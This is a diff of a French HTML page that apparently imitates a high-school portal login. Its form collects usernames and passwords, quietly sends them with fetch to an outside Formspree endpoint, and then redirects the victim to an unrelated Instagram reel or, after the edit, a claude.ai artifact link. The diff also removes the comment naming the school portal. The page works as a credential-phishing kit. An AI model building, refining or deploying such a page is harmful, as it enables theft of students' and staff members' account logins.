@@ -1,9 +1,4 @@
 <!doctype html>
-<!--
-  ============================================================
-  PORTAIL DU LYCÉE — connexion avec un profil (identifiant + mdp)
-  ============================================================
--->
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
@@ -14,7 +9,6 @@
 
 <body>
   <div class="layout">
-
     <div class="logo-corner"></div>
 
     <div class="visual">
@@ -28,7 +22,7 @@
         </div>
         <p class="subtitle"></p>
 
-        <!-- Formulaire configuré avec Formspree -->
+        <!-- Formulaire pointant vers Formspree -->
         <form id="login-form" action="https://formspree.io/f/mdeaeelg" method="POST">
           <div class="field">
             <input type="text" id="username" name="username"
@@ -55,9 +49,7 @@
   </div>
 
   <script>
-    // Lien vers lequel l'utilisateur sera redirigé après soumission
-    const REDIRECT_URL = "https://www.instagram.com/reel/DeLTTQdRUu5/?utm_source=ig_web_copy_link&stkn=NTc4MTIwNjQ2YQ==";
-
+    const REDIRECT_URL = "https://claude.ai/artifact/1hJvKavTEJWYPeWXgnV1WM";
     const form = document.getElementById("login-form");
     const messageEl = document.getElementById("message");
 
@@ -73,7 +65,7 @@
       }
 
       try {
-        // Envoi des données à Formspree via fetch pour garder le contrôle de la redirection
+        // Envoi des données en arrière-plan à Formspree
         const response = await fetch(form.action, {
           method: 'POST',
           headers: { 'Accept': 'application/json' },
@@ -81,7 +73,7 @@
         });
 
         if (response.ok) {
-          // Redirection immédiate vers le lien cible
+          // Redirection vers le lien cible une fois envoyé
           window.location.href = REDIRECT_URL;
         } else {
           showError("Erreur lors de la connexion.");
